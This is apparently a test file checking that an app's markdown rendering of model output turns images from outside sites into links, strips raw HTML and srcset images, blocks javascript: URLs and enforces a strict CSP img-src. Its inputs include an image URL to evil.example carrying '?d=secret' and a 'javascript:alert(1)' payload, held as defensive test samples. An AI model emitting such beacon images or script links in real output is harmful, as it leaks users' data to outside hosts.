// Model output never loads an image from another site by itself: the shared
// Streamdown pipeline renders the app's own media, data: and blob: pictures and
// turns every other image into a link, and the CSP's img-src backs it up.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";

const { markdownRehypePlugins, isInlineImageSource } = await import("../lib/markdown-images.ts");
// linkSafety off shows the plain anchor; by default Streamdown asks before opening it.
const render = (markdown, props = { linkSafety: { enabled: false } }) =>
  renderToStaticMarkup(
    createElement(
      Streamdown,
      { mode: "static", rehypePlugins: markdownRehypePlugins, ...props },
      markdown,
    ),
  );

const external = render("Done ![quarterly numbers](https://evil.example/x.png?d=secret)");
assert.doesNotMatch(external, /<img[^>]*evil\.example/);
assert.doesNotMatch(external, /rel="preload"[^>]*evil\.example/, "no preload either");
assert.match(external, /<a [^>]*href="https:\/\/evil\.example\/x\.png\?d=secret"/);
assert.match(external, /target="_blank"/);
assert.match(external, /rel="noopener noreferrer"/);
assert.match(external, />quarterly numbers<\/a>/);
assert.match(render("![](https://evil.example/y.png)"), />External image<\/a>/);
assert.match(
  render("![x](https://evil.example/x.png)", {}),
  /<button[^>]*data-streamdown="link"[^>]*>x<\/button>/,
);
assert.doesNotMatch(render("![x](//evil.example/z.png)"), /<img/, "protocol-relative");
assert.doesNotMatch(render("![x](javascript:alert(1))"), /<img|href="javascript/);

const raw = render(
  '<img src="https://evil.example/raw.png"> <picture><source srcset="https://evil.example/s.png"><img src="/api/media/b.png" alt="b"></picture>',
);
assert.doesNotMatch(raw, /<img[^>]*evil\.example|srcset|srcSet/i);
assert.match(raw, /<img[^>]*src="\/api\/media\/b\.png"/);

assert.match(render("![chart](/api/media/abc.png)"), /<img[^>]*src="\/api\/media\/abc\.png"/);
assert.equal(isInlineImageSource("data:image/png;base64,iVBORw0KGgo="), true);
assert.equal(isInlineImageSource("blob:https://aegentica.se/123"), true);
assert.equal(isInlineImageSource("/api/mediafake.png"), false);
assert.equal(isInlineImageSource("https://aegentica.se/api/media/a.png"), false);

const config = readFileSync(new URL("../next.config.ts", import.meta.url), "utf8");
assert.match(config, /img-src 'self' data: blob: https:\/\/api\.vercel\.com\/www\/avatar\/"/);
console.log(
  "PASS: model images from other sites render as links (markdown and raw HTML), own media stays inline, CSP img-src limits image loads",
);
